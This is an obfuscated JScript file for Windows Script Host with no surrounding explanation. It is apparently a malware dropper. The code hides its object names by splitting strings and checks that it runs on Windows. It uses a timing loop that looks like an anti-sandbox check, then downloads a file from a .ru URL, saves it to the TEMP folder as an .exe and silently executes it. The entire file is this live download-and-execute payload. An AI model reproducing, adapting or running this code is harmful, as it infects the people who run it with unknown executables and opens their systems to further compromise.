var I = false;
var T0 = "Create"+"Object";
var H = function SV() {return WScript[T0]("WScript"+".Shell");}(), AG = 11;
var Z = "MSXML2"+".XMLHTTP";
var R0 = 2;
var JY = R0 - 2;
function TJ(U){H["Run"](U, JY, JY);};
function R(){return Z + "";};
function JB(O, VM){JY = JY * 1; return O - VM;};
function G(){return T0;};
/*@cc_on
  @if (@_win32 || @_win64)
    I = true;
  @end
@*/
if (I)
{
var E = "";
function HT(){return 22;};
var R1 = 0; var Q = 0;
function WO()
{
var G0 = new this["Date"]();
var ZS = G0["getUTCMilliseconds"]();
WScript["Sleep"](HT());
var G0 = new this["Date"]();
var P = G0["getUTCMilliseconds"]();
WScript["Sleep"](HT());
var G0 = new this["Date"]();
var BE = G0["getUTCMilliseconds"]();
var R1 = "EI";
R1 = JB(P, ZS);
var Q = "A";
Q = JB(BE, P);
E = "open";
return JB(R1, Q);
}
var ZE = false;
var LV = false;
for (var KX = JY; KX < HT() * 1; KX++){if (WO() != JY){
ZE = true; 
Q = "31" + 11 * R1 + Q; 
LV = true; 
break;
}}
function F() {return ((ZE == true) && (ZE == LV)) ? 1 : JY;};
if (ZE && F() && LV){
function VT() {return H["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "MrbgqMolK.ex" + "e";};
 J = R();
 X = WScript[T0](J);
 var Y = 1;
do { 
	for (;Y;){
	try {
		if (Y == 1)
		{
			X[E]("GET", "http://jafes.ru/b0ros", false);
			X["send"]();
			PW = "Sleep";
			Y = 2;
		}
		WScript[PW](HT() + 120); 
		if (X["readystate"] < 2 * 2) continue;
		Y = JY;
		function T(WO0) {var FX = (1, 2, 3, 4, 5, WO0); return FX;};
		EP = WScript[G()]("ADODB.Stream");
		J = EP;
		J[E]();
		J["type"] = T(1);
		J["write"](X["ResponseBody"]);
		EP["position"] = T(JY);
		J["Save" + "ToFile"](VT(), 2);
		EP["cl"+"ose"]();
		S = VT();
		TJ(S);
	} catch(T1){};};
}while (Y);
}
}

